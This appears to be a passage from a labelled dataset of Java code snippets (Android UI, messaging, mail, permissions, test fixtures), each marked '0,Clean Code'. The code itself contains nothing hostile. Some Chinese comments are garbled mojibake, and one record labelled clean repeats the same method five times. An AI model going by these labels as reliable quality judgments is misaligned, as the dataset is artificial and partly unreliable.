      continue;
    }
    List<Message> messageList=consumeResult.getMessageList();
    List<T> records=new ArrayList<>();
    if (messageList != null) {
      lastConsumeInstant=Instant.now();
      for (      Message message : messageList) {
        T record=deserializationSchema.deserialize(message.getData());
        records.add(record);
      }
    }
synchronized (ctx.getCheckpointLock()) {
      for (      T record : records) {
        ctx.collect(record);
      }
      currentOffsets.put(consumeResult.getPartitionKey(),consumeResult.getCurrOffset());
    }
    ConsumerResult confirmResult=messagePullConsumer.confirmConsume(consumeResult.getConfirmContext(),true);
    if (!confirmResult.isSuccess()) {
      if (!(confirmResult.getErrCode() == 400 || confirmResult.getErrCode() == 404 || confirmResult.getErrCode() == 405 || confirmResult.getErrCode() == 406 || confirmResult.getErrCode() == 407 || confirmResult.getErrCode() == 408)) {
        LOG.warn(""Could not confirm messages to tubemq (errcode: {}, "" + ""errmsg: {})."",confirmResult.getErrCode(),confirmResult.getErrMsg());
      }
    }
  }
}",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  if (isLike) {
    float progress=progressToLiked.set(liked ? 1f : 0f);
    if (progress < 1f) {
      sharedResources.likeDrawable.setBounds(getPaddingLeft(),getPaddingTop(),getMeasuredWidth() - getPaddingRight(),getMeasuredHeight() - getPaddingBottom());
      sharedResources.likeDrawable.setAlpha((int)(255));
      sharedResources.likeDrawable.draw(canvas);
    }
    if (progress > 0) {
      sharedResources.likeDrawableFilled.setBounds(getPaddingLeft(),getPaddingTop(),getMeasuredWidth() - getPaddingRight(),getMeasuredHeight() - getPaddingBottom());
      sharedResources.likeDrawableFilled.setAlpha((int)(progress * 255));
      sharedResources.likeDrawableFilled.draw(canvas);
    }
  }
 else {
    if (allowDrawReaction) {
      ImageReceiver receiverToDraw=emojiDrawable != null ? emojiDrawable.getImageReceiver() : reactionImageReceiver;
      if (drawAnimateImageReciever && animateReactionImageReceiver.getBitmap() != null) {
        receiverToDraw=animateReactionImageReceiver;
        int size=getMeasuredWidth() - getPaddingLeft() - getPaddingRight();
        receiverToDraw.setImageCoords(getPaddingLeft() - size / 2f,getPaddingTop() - size / 2f,size * 2,size * 2);
        if (animateReactionImageReceiver.getLottieAnimation() != null && animateReactionImageReceiver.getLottieAnimation().isLastFrame()) {
          drawAnimateImageReciever=false;
          reactionImageReceiver.setCrossfadeAlpha((byte)0);
        }
      }
 else {
        if (receiverToDraw != null) {
          receiverToDraw.setImageCoords(getPaddingLeft(),getPaddingTop(),getMeasuredWidth() - getPaddingLeft() - getPaddingRight(),getMeasuredHeight() - getPaddingTop() - getPaddingBottom());
        }
      }
      if (receiverToDraw != null) {
        receiverToDraw.draw(canvas);
      }
    }
  }
}",0,Clean Code
"/** 
 * Tests that adaptive audio track selections respect the maximum audio bitrate. 
 */
public void testSelectAdaptiveAudioTrackGroupWithMaxBitrate() throws ExoPlaybackException {
  Format format128k=Format.createAudioSampleFormat(""128"",MimeTypes.AUDIO_AAC,""mp4a.40.2"",128 * 1024,Format.NO_VALUE,2,44100,null,null,0,null);
  Format format192k=Format.createAudioSampleFormat(""192"",MimeTypes.AUDIO_AAC,""mp4a.40.2"",192 * 1024,Format.NO_VALUE,2,44100,null,null,0,null);
  Format format256k=Format.createAudioSampleFormat(""256"",MimeTypes.AUDIO_AAC,""mp4a.40.2"",256 * 1024,Format.NO_VALUE,2,44100,null,null,0,null);
  RendererCapabilities[] rendererCapabilities={ALL_AUDIO_FORMAT_SUPPORTED_RENDERER_CAPABILITIES};
  TrackGroupArray trackGroups=new TrackGroupArray(new TrackGroup(format192k,format128k,format256k));
  TrackSelectorResult result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),0,1,2);
  trackSelector.setParameters(trackSelector.buildUponParameters().setMaxAudioBitrate(256 * 1024 - 1));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),0,1);
  trackSelector.setParameters(trackSelector.buildUponParameters().setMaxAudioBitrate(192 * 1024));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),0,1);
  trackSelector.setParameters(trackSelector.buildUponParameters().setMaxAudioBitrate(192 * 1024 - 1));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),1);
  trackSelector.setParameters(trackSelector.buildUponParameters().setMaxAudioBitrate(10));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),1);
}",0,Clean Code
"@Async public void sendHtmlTemplateMail(Map<String,Object> map,String toAccount,String subject,String template){
  try {
    MimeMessage mimeMessage=javaMailSender.createMimeMessage();
    MimeMessageHelper messageHelper=new MimeMessageHelper(mimeMessage);
    Context context=new Context();
    context.setVariables(map);
    String process=templateEngine.process(template,context);
    messageHelper.setFrom(mailProperties.getUsername());
    messageHelper.setTo(toAccount);
    messageHelper.setSubject(subject);
    messageHelper.setText(process,true);
    javaMailSender.send(mimeMessage);
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}
",0,Clean Code
"/** 
 * Parameter conversion
 * @param dto
 * @return
 */
public abstract SqlVO dto2vo(Sql dto);
/** 
 * Model conversion
 * @param dto
 * @return
 */
public abstract ExecuteResultVO dto2vo(ExecuteResult dto);
/** 
 * Model conversion
 * @param dtos
 * @return
 */
public abstract List<ExecuteResultVO> dto2vo(List<ExecuteResult> dtos);",0,Clean Code
"public static java.sql.Timestamp columnToTimestamp(Object column,SimpleDateFormat customTimeFormat,String timeZone){
  if (column == null) {
    return null;
  }
 else   if (column instanceof String) {
    if (((String)column).length() == 0) {
      return null;
    }
    Date date=stringToDate((String)column,customTimeFormat,timeZone);
    if (null == date) {
      return null;
    }
    return new java.sql.Timestamp(date.getTime());
  }
 else   if (column instanceof Integer) {
    Integer rawData=(Integer)column;
    return new java.sql.Timestamp(getMillSecond(rawData.toString()));
  }
 else   if (column instanceof Long) {
    Long rawData=(Long)column;
    return new java.sql.Timestamp(getMillSecond(rawData.toString()));
  }
 else   if (column instanceof java.sql.Date) {
    return new java.sql.Timestamp(((java.sql.Date)column).getTime());
  }
 else   if (column instanceof Timestamp) {
    return (Timestamp)column;
  }
 else   if (column instanceof Date) {
    Date d=(Date)column;
    return new java.sql.Timestamp(d.getTime());
  }
  throw new IllegalArgumentException(""Can't convert "" + column.getClass().getName() + "" to Date"");
}",0,Clean Code
"private void unpackInitializationHint(AnnotationNode typeInfo,HintDeclaration ch){
  List<Object> values=typeInfo.values;
  List<org.objectweb.asm.Type> types=new ArrayList<>();
  List<String> typeNames=new ArrayList<>();
  List<String> packageNames=new ArrayList<>();
  InitializationTime initTime=null;
  for (int i=0; i < values.size(); i+=2) {
    String key=(String)values.get(i);
    Object value=values.get(i + 1);
    if (key.equals(""types"")) {
      types=(ArrayList<org.objectweb.asm.Type>)value;
    }
 else     if (key.equals(""typeNames"")) {
      typeNames=(ArrayList<String>)value;
    }
 else     if (key.equals(""packageNames"")) {
      packageNames=(ArrayList<String>)value;
    }
 else     if (key.equals(""initTime"")) {
      initTime=InitializationTime.valueOf(((String[])value)[1]);
    }
  }
  for (  org.objectweb.asm.Type type : types) {
    String typeName=type.getClassName();
    typeNames.add(typeName);
  }
  InitializationDescriptor id=new InitializationDescriptor();
  if (initTime == InitializationTime.BUILD) {
    for (    String typeName : typeNames) {
      id.addBuildtimeClass(typeName);
    }
    for (    String packageName : packageNames) {
      id.addBuildtimePackage(packageName);
    }
  }
 else {
    for (    String typeName : typeNames) {
      id.addRuntimeClass(typeName);
    }
    for (    String packageName : packageNames) {
      id.addRuntimePackage(packageName);
    }
  }
  ch.addInitializationDescriptor(id);
}",0,Clean Code
"/** 
 * 浠巇umpsys package鐨勭粨鏋滆緭鍑鸿В鏋愭潈闄愬垪琛�
 * @param dumpsysOutput dumpsys package鐨勭粨鏋滆緭鍑�
 * @param groupNames    鏉冮檺缁勫悕
 * @param grantedState  鏄惁鑾峰彇鎺堟潈鐘舵��
 * @return 瑙ｆ瀽鍑虹殑鏉冮檺鍒楄〃
 */
public static List<AndroidPermissionItem> extractPermissions(String dumpsysOutput,List<String> groupNames,Boolean grantedState){
  List<AndroidPermissionItem> result=new ArrayList<>();
  for (  String groupName : groupNames) {
    Pattern groupPattern=Pattern.compile(""^(\\s*"" + Pattern.quote(groupName) + "" permissions:[\\s\\S]+)"",Pattern.MULTILINE);
    Matcher groupMatcher=groupPattern.matcher(dumpsysOutput);
    if (!groupMatcher.find()) {
      continue;
    }
    String groupMatch=groupMatcher.group(1);
    String[] lines=groupMatch.split(""\n"");
    if (lines.length < 2) {
      continue;
    }
    int titleIndent=lines[0].indexOf(lines[0].trim());
    for (int i=1; i < lines.length; i++) {
      String line=lines[i];
      int currentIndent=line.indexOf(line.trim());
      if (currentIndent <= titleIndent) {
        break;
      }
      Pattern permissionNamePattern=Pattern.compile(""android\\.\\w*\\.?permission\\.\\w+"");
      Matcher permissionNameMatcher=permissionNamePattern.matcher(line);
      if (!permissionNameMatcher.find()) {
        continue;
      }
      String permissionName=permissionNameMatcher.group();
      AndroidPermissionItem item=new AndroidPermissionItem(permissionName);
      if (grantedState != null) {
        Pattern grantedStatePattern=Pattern.compile(""\\bgranted=(\\w+)"");
        Matcher grantedStateMatcher=grantedStatePattern.matcher(line);
        if (grantedStateMatcher.find()) {
          boolean isGranted=grantedStateMatcher.group(1).equals(""true"");
          item.setGranted(isGranted);
        }
      }
      result.add(item);
    }
  }
  return result;
}",0,Clean Code
"@Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  View root=inflater.inflate(R.layout.lb_search_fragment,container,false);
  FrameLayout searchFrame=(FrameLayout)root.findViewById(R.id.lb_search_frame);
  mSearchBar=(SearchBar)searchFrame.findViewById(R.id.lb_search_bar);
  mSearchBar.setSearchBarListener(new SearchBar.SearchBarListener(){
    @Override public void onSearchQueryChange(    String query){
      if (DEBUG)       Log.v(TAG,String.format(""onSearchQueryChange %s %s"",query,null == mProvider ? ""(null)"" : mProvider));
      if (null != mProvider) {
        retrieveResults(query);
      }
 else {
        mPendingQuery=query;
      }
    }
    @Override public void onSearchQuerySubmit(    String query){
      if (DEBUG)       Log.v(TAG,String.format(""onSearchQuerySubmit %s"",query));
      submitQuery(query);
    }
    @Override public void onKeyboardDismiss(    String query){
      if (DEBUG)       Log.v(TAG,String.format(""onKeyboardDismiss %s"",query));
      queryComplete();
    }
  }
);
  mSearchBar.setSpeechRecognitionCallback(mSpeechRecognitionCallback);
  mSearchBar.setPermissionListener(mPermissionListener);
  applyExternalQuery();
  readArguments(getArguments());
  if (null != mBadgeDrawable) {
    setBadgeDrawable(mBadgeDrawable);
  }
  if (null != mTitle) {
    setTitle(mTitle);
  }
  if (getChildFragmentManager().findFragmentById(R.id.lb_results_frame) == null) {
    mRowsFragment=new RowsFragment();
    getChildFragmentManager().beginTransaction().replace(R.id.lb_results_frame,mRowsFragment).commit();
  }
 else {
    mRowsFragment=(RowsFragment)getChildFragmentManager().findFragmentById(R.id.lb_results_frame);
  }
  mRowsFragment.setOnItemViewSelectedListener(new OnItemViewSelectedListener(){
    @Override public void onItemSelected(    ViewHolder itemViewHolder,    Object item,    RowPresenter.ViewHolder rowViewHolder,    Row row){
      if (DEBUG) {
        int position=mRowsFragment.getSelectedPosition();
        Log.v(TAG,String.format(""onItemSelected %d"",position));
      }
      updateSearchBarVisibility();
      if (null != mOnItemViewSelectedListener) {
        mOnItemViewSelectedListener.onItemSelected(itemViewHolder,item,rowViewHolder,row);
      }
    }
  }
);
  mRowsFragment.setOnItemViewClickedListener(mOnItemViewClickedListener);
  mRowsFragment.setExpand(true);
  if (null != mProvider) {
    onSetSearchResultProvider();
  }
  return root;
}
",0,Clean Code
"private void supplementExamineInfoForExport(Map<String,Object> map){
  Object examineRecordId=map.get(""examineRecordId"");
  if (examineRecordId == null) {
    map.put(""examineUserName"","""");
    return;
  }
  Object examineStatus=map.get(""examineStatusBack"");
  if (examineStatus == null) {
    examineStatus=-1;
  }
  ExamineRecordReturnVO recordReturnVO=examineService.queryExamineRecordInfo((Integer)examineRecordId).getData();
  List<Long> userIds=recordReturnVO.getExamineUserIds();
  String examineName="""";
  if (CollUtil.isNotEmpty(userIds) && (Integer)examineStatus != 4) {
    List<SimpleUser> userList=UserCacheUtil.getSimpleUsers(userIds);
    examineName=userList.stream().map(SimpleUser::getRealname).collect(Collectors.joining("",""));
  }
  if ((Integer)examineStatus == 4) {
    Object createUserName=map.get(""createUserName"");
    examineName=createUserName != null ? createUserName.toString() : """";
  }
  map.put(""examineUserName"",examineName);
}",0,Clean Code
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  Intent intent=getIntent();
  String[] permissions=intent.getStringArrayExtra(INTENT_EXTRA_PERMISSIONS);
  if (permissions.length == 0)   finish();
  _requestCode=intent.getIntExtra(INTENT_EXTRA_REQUEST_CODE,-1);
  if (_requestCode == -1)   finish();
  _permissionListener=PermissionsUtil.getPermissionListener(_requestCode);
  for (  String permission : permissions) {
    if (permission == null || permission.isEmpty()) {
      throw new RuntimeException(""permission can't be null or empty"");
    }
    if (ContextCompat.checkSelfPermission(this,permission) == PERMISSION_GRANTED) {
      _permissions_granted.add(permission);
    }
 else {
      _permissions_denied.add(permission);
    }
  }
  if (_permissions_denied.isEmpty()) {
    if (_permissions_granted.isEmpty()) {
      throw new RuntimeException(""there are no permissions"");
    }
 else {
      if (_permissionListener != null) {
        _permissionListener.onPermissionGranted(_permissions_granted.toArray(new String[0]));
      }
      finish();
    }
  }
 else {
    ActivityCompat.requestPermissions(this,_permissions_denied.toArray(new String[0]),_requestCode);
  }
}",0,Clean Code
"public double discountAmount(int type,double typeContent,double skuPrice,double typeExt){
  if (1 == type) {
    return skuPrice - typeContent;
  }
  if (2 == type) {
    if (skuPrice < typeExt)     return skuPrice;
    return skuPrice - typeContent;
  }
  if (3 == type) {
    return skuPrice * typeContent;
  }
  if (4 == type) {
    return typeContent;
  }
  return 0D;
}",0,Clean Code
"public Criteria andBuildInNotEqualTo(Boolean value){
  addCriterion(""build_in <>"",value,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotEqualTo(Boolean value){
  addCriterion(""build_in <>"",value,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotEqualTo(Boolean value){
  addCriterion(""build_in <>"",value,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotEqualTo(Boolean value){
  addCriterion(""build_in <>"",value,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotEqualTo(Boolean value){
  addCriterion(""build_in <>"",value,""buildIn"");
  return (Criteria)this;
}
",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_refresh) {
    mModel.reload();
    return true;
  }
 else   if (id == R.id.action_shortcut) {
    Uri uri=mPathListAdapter.getCurrentUri();
    if (uri != null) {
      mModel.createShortcut(uri);
    }
    return true;
  }
 else   if (id == R.id.action_storage) {
    ThreadUtils.postOnBackgroundThread(() -> {
      ArrayMap<String,Uri> storageLocations=StorageUtils.getAllStorageLocations(mActivity);
      if (storageLocations.size() == 0) {
        mActivity.runOnUiThread(() -> {
          if (isDetached())           return;
          new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.storage).setMessage(R.string.no_volumes_found).setNegativeButton(R.string.ok,null).show();
        }
);
        return;
      }
      Uri[] backupVolumes=new Uri[storageLocations.size()];
      CharSequence[] backupVolumesStr=new CharSequence[storageLocations.size()];
      for (int i=0; i < storageLocations.size(); ++i) {
        backupVolumes[i]=storageLocations.valueAt(i);
        backupVolumesStr[i]=new SpannableStringBuilder(storageLocations.keyAt(i)).append(""\n"").append(getSecondaryText(mActivity,getSmallerText(backupVolumes[i].getPath())));
      }
      mActivity.runOnUiThread(() -> {
        if (isDetached())         return;
        new SearchableItemsDialogBuilder<>(mActivity,backupVolumesStr).setTitle(R.string.storage).setOnItemClickListener((dialog,which,item1) -> {
          mModel.loadFiles(backupVolumes[which]);
          dialog.dismiss();
        }
).setNegativeButton(R.string.cancel,null).show();
      }
);
    }
);
    return true;
  }
 else   if (id == R.id.action_list_options) {
    FmListOptions listOptions=new FmListOptions();
    listOptions.setListOptionActions(mModel);
    listOptions.show(getChildFragmentManager(),FmListOptions.TAG);
    return true;
  }
 else   if (id == R.id.action_paste) {
    FmTasks.FmTask task=FmTasks.getInstance().dequeue();
    if (task != null) {
      startBatchPaste(task);
    }
    return true;
  }
 else   if (id == R.id.action_new_window) {
    Intent intent=new Intent(mActivity,FmActivity.class);
    if (!mModel.getOptions().isVfs) {
      intent.setDataAndType(mModel.getCurrentUri(),DocumentsContract.Document.MIME_TYPE_DIR);
    }
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.action_settings) {
    Intent intent=SettingsActivity.getIntent(requireContext(),""files_prefs"");
    startActivity(intent);
    return true;
  }
  return super.onOptionsItemSelected(item);
}",0,Clean Code
"private void updateGrid(Video item){
  updateVideoGrid(obtainUploadsObservable(item));
}
public void updateGrid(MediaGroup mediaGroup){
  if (getView() == null) {
    disposeActions();
    mVideoItem=null;
    mRootGroup=mediaGroup;
    return;
  }
  VideoGroup group=VideoGroup.from(mediaGroup);
  getView().update(group);
  mDeArrowProcessor.process(group);
  if (mediaGroup.getMediaItems() != null) {
    getView().showProgressBar(false);
  }
}
",0,Clean Code
"void performStart(){
  mChildFragmentManager.noteStateNotSaved();
  mChildFragmentManager.execPendingActions();
  mState=STARTED;
  mCalled=false;
  onStart();
  if (!mCalled) {
    throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");
  }
  mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START);
  if (mView != null) {
    mViewLifecycleOwner.handleLifecycleEvent(Lifecycle.Event.ON_START);
  }
  mChildFragmentManager.dispatchStart();
}
",0,Clean Code
"public void doExport(DatabaseExportDataParam param,HttpServletResponse response){
  String databaseName=param.getDatabaseName();
  String schemaName=param.getSchemaName();
  setResponseHeaders(param,response);
  try (ServletOutputStream outputStream=response.getOutputStream();ZipOutputStream zipOut=new ZipOutputStream(outputStream);Connection connection=Chat2DBContext.getConnection()){
    List<String> tableNames=Chat2DBContext.getMetaData().tableNames(connection,databaseName,schemaName,null);
    tableNames.addAll(Chat2DBContext.getMetaData().viewNames(connection,databaseName,schemaName));
    for (    String tableName : tableNames) {
      String fileName=tableName + getSuffix();
      zipOut.putNextEntry(new ZipEntry(fileName));
      ByteArrayOutputStream byteOut=exportData(connection,databaseName,schemaName,tableName);
      byteOut.writeTo(zipOut);
      zipOut.closeEntry();
      byteOut.close();
    }
  }
 catch (  Exception e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"private void startRinging(){
  if (currentState == STATE_WAITING_INCOMING) {
    return;
  }
  if (USE_CONNECTION_SERVICE && systemCallConnection != null) {
    systemCallConnection.setRinging();
  }
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""starting ringing for call "" + privateCall.id);
  }
  dispatchStateChanged(STATE_WAITING_INCOMING);
  if (!notificationsDisabled && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    showIncomingNotification(ContactsController.formatName(user.first_name,user.last_name),null,user,privateCall.video,0);
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""Showing incoming call notification"");
    }
  }
 else {
    startRingtoneAndVibration(user.id);
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""Starting incall activity for incoming call"");
    }
    try {
      PendingIntent.getActivity(VoIPService.this,12345,new Intent(VoIPService.this,LaunchActivity.class).setAction(""voip""),PendingIntent.FLAG_MUTABLE).send();
    }
 catch (    Exception x) {
      if (BuildVars.LOGS_ENABLED) {
        FileLog.e(""Error starting incall activity"",x);
      }
    }
  }
}",0,Clean Code
"private void changePage(boolean next){
  int previously=currentPage;
  currentPage=Mth.clamp(currentPage + (next ? 1 : -1),0,50);
  if (currentPage == previously)   return;
  editingIndex=-1;
  if (pages.size() <= currentPage) {
    if (readonly) {
      currentPage=previously;
      return;
    }
    pages.add(new ArrayList<>());
  }
  currentEntries=pages.get(currentPage);
  if (currentEntries.isEmpty()) {
    currentEntries.add(new ClipboardEntry(false,Components.empty()));
    if (!readonly) {
      editingIndex=0;
      editContext.setCursorToEnd();
      clearDisplayCacheAfterChange();
    }
  }
  forward.visible=currentPage < 50 && (!readonly || currentPage + 1 < pages.size());
  backward.visible=currentPage > 0;
  if (next)   return;
  if (pages.get(currentPage + 1).stream().allMatch(ce -> ce.text.getString().isBlank()))   pages.remove(currentPage + 1);
}",0,Clean Code
"/** 
 * 鍒濆鍖� getUserPage 鏂规硶鐨勬祴璇曟暟鎹�
 */
private AdminUserDO initGetUserPageData(){
  AdminUserDO dbUser=randomAdminUserDO(o -> {
    o.setUsername(""tudou"");
    o.setMobile(""15601691300"");
    o.setStatus(CommonStatusEnum.ENABLE.getStatus());
    o.setCreateTime(buildTime(2020,12,12));
    o.setDeptId(2L);
  }
);
  userMapper.insert(dbUser);
  userMapper.insert(cloneIgnoreId(dbUser,o -> o.setUsername(""dou"")));
  userMapper.insert(cloneIgnoreId(dbUser,o -> o.setMobile(""18818260888"")));
  userMapper.insert(cloneIgnoreId(dbUser,o -> o.setStatus(CommonStatusEnum.DISABLE.getStatus())));
  userMapper.insert(cloneIgnoreId(dbUser,o -> o.setCreateTime(buildTime(2020,11,11))));
  userMapper.insert(cloneIgnoreId(dbUser,o -> o.setDeptId(0L)));
  return dbUser;
}",0,Clean Code
"public static ProcessingResult onItemReceived(TransportedItemStack s,TransportedItemStackHandlerBehaviour i,DeployerBlockEntity blockEntity){
  if (blockEntity.getSpeed() == 0)   return ProcessingResult.PASS;
  if (blockEntity.mode == Mode.PUNCH)   return ProcessingResult.PASS;
  BlockState blockState=blockEntity.getBlockState();
  if (!blockState.hasProperty(FACING) || blockState.getValue(FACING) != Direction.DOWN)   return ProcessingResult.PASS;
  if (blockEntity.state != State.WAITING)   return ProcessingResult.HOLD;
  if (blockEntity.redstoneLocked)   return ProcessingResult.PASS;
  DeployerFakePlayer player=blockEntity.getPlayer();
  ItemStack held=player == null ? ItemStack.EMPTY : player.getMainHandItem();
  if (held.isEmpty())   return ProcessingResult.HOLD;
  if (blockEntity.getRecipe(s.stack) == null)   return ProcessingResult.PASS;
  blockEntity.start();
  return ProcessingResult.HOLD;
}",0,Clean Code
"private String getRedisUri(){
  StringBuffer sb=new StringBuffer(""redis://"");
  sb.append(hostName).append("":"").append(port);
  sb.append(""?"");
  if (!StringUtils.isEmpty(authPassword)) {
    sb.append(""authPassword="").append(authPassword).append(""&"");
  }
  if (!StringUtils.isEmpty(authUser)) {
    sb.append(""authUser="").append(authUser).append(""&"");
  }
  if (!StringUtils.isEmpty(readTimeout)) {
    sb.append(""readTimeout="").append(readTimeout).append(""&"");
  }
  if (ssl) {
    sb.append(""ssl="").append(""yes"").append(""&"");
  }
  if (!StringUtils.isEmpty(snapShot)) {
    sb.append(""replOffset="").append(snapShot).append(""&"");
  }
  if (!StringUtils.isEmpty(replId)) {
    sb.append(""replId="").append(replId).append(""&"");
  }
  if (sb.charAt(sb.length() - 1) == '?' || sb.charAt(sb.length() - 1) == '&') {
    sb.deleteCharAt(sb.length() - 1);
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * Returns the least restrictive type T, such that a value of type T can be compared with values of type  {@code type0} and {@code type1} using{@code =}. 
 */
public static RelDataType leastRestrictiveForComparison(RelDataTypeFactory typeFactory,RelDataType type1,RelDataType type2){
  final RelDataType type=typeFactory.leastRestrictive(ImmutableList.of(type1,type2));
  if (type != null) {
    return type;
  }
  final RelDataTypeFamily family1=family(type1);
  final RelDataTypeFamily family2=family(type2);
  if (family1 == SqlTypeFamily.ANY) {
    return type2;
  }
  if (family2 == SqlTypeFamily.ANY) {
    return type1;
  }
  if (family1 == SqlTypeFamily.NULL) {
    return type2;
  }
  if (family2 == SqlTypeFamily.NULL) {
    return type1;
  }
  if (family1 == SqlTypeFamily.CHARACTER && canConvertStringInCompare(family2)) {
    return type2;
  }
  if (family2 == SqlTypeFamily.CHARACTER && canConvertStringInCompare(family1)) {
    return type1;
  }
  return null;
}",0,Clean Code
"private void updateClipView(boolean fromLayout){
  int height=0;
  int top;
  RecyclerView.ViewHolder holder=listView.findViewHolderForAdapterPosition(0);
  if (holder != null) {
    top=(int)holder.itemView.getY();
    height=overScrollHeight + (Math.min(top,0));
  }
 else {
    top=-mapViewClip.getMeasuredHeight();
  }
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)mapViewClip.getLayoutParams();
  if (layoutParams != null) {
    if (height <= 0) {
      if (mapView.getView().getVisibility() == View.VISIBLE) {
        mapView.getView().setVisibility(View.INVISIBLE);
        mapViewClip.setVisibility(View.INVISIBLE);
        if (overlayView != null) {
          overlayView.setVisibility(View.INVISIBLE);
        }
      }
    }
 else {
      if (mapView.getView().getVisibility() == View.INVISIBLE) {
        mapView.getView().setVisibility(View.VISIBLE);
        mapViewClip.setVisibility(View.VISIBLE);
        if (overlayView != null) {
          overlayView.setVisibility(View.VISIBLE);
        }
      }
    }
    mapViewClip.setTranslationY(Math.min(0,top));
    mapView.getView().setTranslationY(Math.max(0,-top / 2));
    if (overlayView != null) {
      overlayView.setTranslationY(Math.max(0,-top / 2));
    }
    float translationY=Math.min(overScrollHeight - mapTypeButton.getMeasuredHeight() - AndroidUtilities.dp(64 + (locationType == LOCATION_TYPE_SEND || locationType == LOCATION_TYPE_SEND_WITH_LIVE ? 30 : 10)),-top);
    mapTypeButton.setTranslationY(translationY);
    proximityButton.setTranslationY(translationY);
    if (hintView != null) {
      hintView.setExtraTranslationY(translationY);
    }
    if (searchAreaButton != null) {
      searchAreaButton.setTranslation(translationY);
    }
    if (markerImageView != null) {
      markerImageView.setTranslationY(markerTop=-top - AndroidUtilities.dp(markerImageView.getTag() == null ? 48 : 69) + height / 2);
    }
    if (!fromLayout) {
      layoutParams=(FrameLayout.LayoutParams)mapView.getView().getLayoutParams();
      if (layoutParams != null && layoutParams.height != overScrollHeight + AndroidUtilities.dp(10)) {
        layoutParams.height=overScrollHeight + AndroidUtilities.dp(10);
        if (map != null) {
          map.setPadding(AndroidUtilities.dp(70),0,AndroidUtilities.dp(70),AndroidUtilities.dp(10));
        }
        mapView.getView().setLayoutParams(layoutParams);
      }
      if (overlayView != null) {
        layoutParams=(FrameLayout.LayoutParams)overlayView.getLayoutParams();
        if (layoutParams != null && layoutParams.height != overScrollHeight + AndroidUtilities.dp(10)) {
          layoutParams.height=overScrollHeight + AndroidUtilities.dp(10);
          overlayView.setLayoutParams(layoutParams);
        }
      }
    }
  }
}",0,Clean Code
"@Override public Object getExtensionMethod(Object obj,String name,Object... arguments){
  Class<?> cls=obj instanceof Class ? (Class<?>)obj : obj.getClass();
  if (cls.isArray()) {
    cls=Object[].class;
  }
  return getExtensionMethod(cls,name,arguments);
}
private Object getExtensionMethod(Class<?> cls,String name,Object... arguments){
  if (cls == null) {
    cls=Object.class;
  }
  Map<String,List<Method>> methodMap=extensionmethodCache.get(cls);
  if (methodMap != null) {
    List<Method> methodList=methodMap.get(name);
    if (methodList != null) {
      Class<?>[] parameterTypes=new Class[arguments.length + 1];
      parameterTypes[0]=cls;
      for (int i=0; i < arguments.length; i++) {
        parameterTypes[i + 1]=arguments[i] == null ? null : arguments[i].getClass();
      }
      return findMethod(methodList,parameterTypes);
    }
  }
  if (cls != Object.class) {
    Class<?>[] interfaces=cls.getInterfaces();
    if (interfaces != null) {
      for (      Class<?> clazz : interfaces) {
        Object method=getExtensionMethod(clazz,name,arguments);
        if (method != null) {
          return method;
        }
      }
    }
    return getExtensionMethod(cls.getSuperclass(),name,arguments);
  }
  return null;
}",0,Clean Code
"private Pair<Boolean,String> matchUri(Set<String> uriSet,String uri){
  if (null == uriSet) {
    return ImmutablePair.of(Boolean.FALSE,null);
  }
  if (uriSet.contains(uri)) {
    return ImmutablePair.of(Boolean.TRUE,uri);
  }
  String[] uriArr=uri.split(""/"");
  for (  String item : uriSet) {
    if (StringUtils.isBlank(item)) {
      continue;
    }
    if (!item.contains(""{"") || !item.contains(""}"")) {
      continue;
    }
    String[] itemArr=item.split(""/"");
    if (itemArr.length != uriArr.length) {
      continue;
    }
    if (UriMatchUtils.match(uriArr,uri)) {
      return ImmutablePair.of(Boolean.TRUE,item);
    }
  }
  return ImmutablePair.of(Boolean.FALSE,null);
}
",0,Clean Code
"@Override protected void process(Set<String> targetDirs,ProcessMethod method) throws InterruptedException {
  for (  var dir : targetDirs) {
    if (Thread.interrupted())     throw new InterruptedException();
    Log.i(TAG,String.format(""Processing: %s"",dir));
    try {
      var path=Paths.get(dir);
      var nomediaFile=path.resolve("".nomedia"").toFile();
      if (method == ProcessMethod.HIDE) {
        var result=nomediaFile.createNewFile();
        if (!result)         Log.w(TAG,String.format("".nomedia already exist: %s"",path));
      }
 else       if (method == ProcessMethod.UNHIDE) {
        if (!nomediaFile.isFile()) {
          Log.w(TAG,String.format("".nomedia not file: %s"",path));
          continue;
        }
        var result=nomediaFile.delete();
        if (!result)         Log.w(TAG,String.format(""Failed to remove .nomedia: %s"",path));
      }
    }
 catch (    Exception e) {
      Log.w(TAG,String.format(""Error while processing %s: "",dir),e);
    }
  }
